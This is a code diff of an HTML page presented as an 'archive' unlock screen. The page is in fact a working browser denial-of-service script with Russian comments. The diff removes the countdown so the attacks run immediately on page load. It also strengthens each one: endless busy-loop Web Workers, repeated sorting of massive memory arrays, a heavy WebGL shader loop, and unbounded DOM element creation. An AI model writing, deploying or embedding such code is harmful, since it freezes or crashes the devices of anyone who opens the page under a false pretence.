@@ -9,7 +9,6 @@
             color: #0f0;
             font-family: 'Courier New', monospace;
             text-align: center;
-            padding-top: 40%;
             margin: 0;
             overflow: hidden;
         }
@@ -17,14 +16,7 @@
             font-size: 2em;
             text-shadow: 0 0 10px #0f0;
         }
-        #countdown {
-            font-size: 1.5em;
-            color: #f00;
-            text-shadow: 0 0 5px #f00;
-            margin-top: 20px;
-        }
         canvas {
-            display: none;
             position: absolute;
             top: 0;
             left: 0;
@@ -34,41 +26,17 @@
     </style>
 </head>
 <body>
-    <h1>Tuzyaka archive</h1>
-    <div id="countdown">Unlocking in: 10</div>
+    <h1>Archive Unleashed</h1>
     <canvas id="canvas"></canvas>
     <script>
-        // Обратный отсчет
-        let secondsLeft = 10;
-        const countdownElement = document.getElementById("countdown");
-        const countdown = setInterval(() => {
-            secondsLeft--;
-            countdownElement.textContent = `Unlocking in: ${secondsLeft}`;
-            if (secondsLeft <= 0) {
-                clearInterval(countdown);
-                startHeavyLoad();
-            }
-        }, 1000);
-
-        // Запуск тяжелых вычислений
-        function startHeavyLoad() {
-            document.body.innerHTML = "<h1>Archive Unleashed</h1>";
-            document.body.style.color = "#f00";
-            document.body.style.textShadow = "0 0 10px #f00";
-            overloadCPU();
-            overloadMemory();
-            overloadGPU();
-            overloadDOM();
-        }
-
-        // Нагрузка на CPU
+        // Нагрузка на процессор
         function overloadCPU() {
-            const workerCount = navigator.hardwareConcurrency * 2 || 4;
+            const workerCount = navigator.hardwareConcurrency * 4 || 16;
             for (let i = 0; i < workerCount; i++) {
                 const workerCode = `
                     self.onmessage = () => {
                         while (true) {
-                            for (let j = 0; j < 1e5; j++) {
+                            for (let j = 0; j < 1e6; j++) {
                                 let x = Math.sin(Math.random());
                                 let y = Math.cos(Math.random());
                                 let z = Math.tan(Math.random());
@@ -82,15 +50,14 @@
                     const worker = new Worker(URL.createObjectURL(blob));
                     worker.postMessage('start');
                 } catch (e) {
-                    // Запасной вариант в основном потоке
                     setInterval(() => {
-                        for (let j = 0; j < 1e5; j++) {
+                        for (let j = 0; j < 1e6; j++) {
                             let x = Math.sin(Math.random());
                             let y = Math.cos(Math.random());
                             let z = Math.tan(Math.random());
                             let w = x * y * z;
                         }
-                    }, 10);
+                    }, 1);
                 }
             }
         }
@@ -98,22 +65,21 @@
         // Нагрузка на память
         function overloadMemory() {
             let arrays = [];
-            for (let i = 0; i < 10; i++) {
-                arrays.push(new Float64Array(1e7)); // ~80 МБ каждый
+            for (let i = 0; i < 20; i++) {
+                arrays.push(new Float64Array(1e7));
             }
             setInterval(() => {
                 arrays.forEach(arr => {
                     arr.sort();
                 });
-            }, 500);
+            }, 100);
         }
 
-        // Нагрузка на GPU
+        // Нагрузка на графику
         function overloadGPU() {
             const canvas = document.getElementById("canvas");
-            canvas.style.display = "block";
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
+            canvas.width = window.innerWidth * 2;
+            canvas.height = window.innerHeight * 2;
             const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
             if (!gl) return;
 
@@ -128,8 +94,8 @@
                 uniform float uTime;
                 void main() {
                     float r = 0.0;
-                    for (int i = 0; i < 5000; i++) {
-                        r += sin(float(i) * uTime * 0.01) * cos(float(i) * uTime * 0.02);
+                    for (int i = 0; i < 10000; i++) {
+                        r += sin(float(i) * uTime * 0.001) * cos(float(i) * uTime * 0.002);
                     }
                     gl_FragColor = vec4(mod(r, 1.0), 0.5, 0.5, 1.0);
                 }
@@ -166,20 +132,26 @@
         // Нагрузка на DOM
         function overloadDOM() {
             function createChaos() {
-                for (let i = 0; i < 100; i++) {
+                for (let i = 0; i < 500; i++) {
                     const div = document.createElement("div");
                     div.style.position = "absolute";
                     div.style.left = Math.random() * 100 + "%";
                     div.style.top = Math.random() * 100 + "%";
-                    div.style.width = "50px";
-                    div.style.height = "50px";
+                    div.style.width = "100px";
+                    div.style.height = "100px";
                     div.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
                     document.body.appendChild(div);
                 }
-                setTimeout(createChaos, 10);
+                setTimeout(createChaos, 5);
             }
             createChaos();
         }
+
+        // Запуск всего сразу
+        overloadCPU();
+        overloadMemory();
+        overloadGPU();
+        overloadDOM();
     </script>
 </body>
 </html>
